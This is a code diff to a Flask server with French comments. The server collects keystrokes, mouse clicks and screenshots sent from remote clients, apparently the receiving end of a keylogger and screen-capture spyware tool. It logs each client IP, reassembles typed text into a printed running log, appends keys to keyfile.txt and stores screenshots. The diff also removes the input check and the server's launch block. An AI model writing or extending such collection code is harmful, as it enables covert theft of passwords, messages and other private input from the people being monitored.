@@ -9,13 +9,17 @@ app = Flask(__name__)
 if not os.path.exists('captures'):
     os.makedirs('captures')
 
+# Variables globales pour gérer les connexions et les frappes clavier
+key_log = ""
+connections = set()
+
+# Afficher l'en-tête du serveur
+print("--- Serveur ---")
+
 @app.route('/upload', methods=['POST'])
 def upload_data():
+    global key_log
     data = request.get_json()
-
-    # Vérifier que les données sont bien reçues
-    if not data:
-        return jsonify({"status": "error", "message": "No data received"}), 400
 
     # Extraire les informations de clic
     click_type = data.get('click_type')
@@ -23,22 +27,36 @@ def upload_data():
     timestamp = data.get('timestamp')
     screenshot_data = data.get('screenshot')
 
-    print(f"Réception d'un {click_type} à la position {position} à {timestamp}")
+    # Obtenir l'IP du client
+    client_ip = request.remote_addr
 
-    # Si une capture d'écran est présente, la sauvegarder
-    if screenshot_data:
-        # Convertir l'image base64 en image et l'enregistrer
-        screenshot = base64.b64decode(screenshot_data)
-        timestamp_str = datetime.fromisoformat(timestamp).strftime('%Y%m%d_%H%M%S_%f')
-        filename = f"captures/screenshot_{timestamp_str}.png"
-        with open(filename, "wb") as f:
-            f.write(screenshot)
-        print(f"Capture d'écran enregistrée sous {filename}")
+    # Si nouvelle connexion, l'ajouter au set et l'afficher
+    if client_ip not in connections:
+        connections.add(client_ip)
+        print(f"[Connection : {client_ip}]")
+
+    # Traiter les clics
+    if click_type and position and timestamp:
+        if screenshot_data:
+            # Convertir l'image base64 en image et l'enregistrer
+            try:
+                screenshot = base64.b64decode(screenshot_data)
+                timestamp_str = datetime.fromisoformat(timestamp).strftime('%Y%m%d_%H%M%S_%f')
+                filename = f"screenshot_{timestamp_str}.png"
+                filepath = os.path.join('captures', filename)
+                with open(filepath, "wb") as f:
+                    f.write(screenshot)
+                print(f"Clic {click_type.replace('_', ' ')} en position ({position['x']}, {position['y']}) [{filename}]")
+            except Exception as e:
+                print(f"Erreur lors de la sauvegarde de la capture d'écran : {e}")
+        else:
+            print(f"Clic {click_type.replace('_', ' ')} en position ({position['x']}, {position['y']})")
 
     return jsonify({"status": "success"}), 200
 
 @app.route('/upload/key', methods=['POST'])
 def upload_key():
+    global key_log
     data = request.get_json()
 
     if not data:
@@ -47,13 +65,29 @@ def upload_key():
     key = data.get('key')
     timestamp = data.get('timestamp')
 
-    print(f"Réception d'une touche '{key}' à {timestamp}")
+    # Obtenir l'IP du client
+    client_ip = request.remote_addr
+
+    # Si nouvelle connexion, l'ajouter au set et l'afficher
+    if client_ip not in connections:
+        connections.add(client_ip)
+        print(f"[Connection : {client_ip}]")
+
+    # Afficher la touche
+    if key.startswith("Key."):
+        # Remplacer les touches spéciales par des symboles ou des noms lisibles
+        special_key = key.replace("Key.", "").capitalize()
+        key_log += special_key
+    else:
+        key_log += key
+
+    print(key_log)
 
     # Enregistrer les touches dans un fichier
-    with open('keyfile.txt', 'a', encoding='utf-8') as logKey:
-        logKey.write(f"{timestamp}: {key}\n")
+    try:
+        with open('keyfile.txt', 'a', encoding='utf-8') as logKey:
+            logKey.write(f"{timestamp}: {key}\n")
+    except Exception as e:
+        print(f"Erreur lors de l'enregistrement des touches : {e}")
 
     return jsonify({"status": "success"}), 200
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
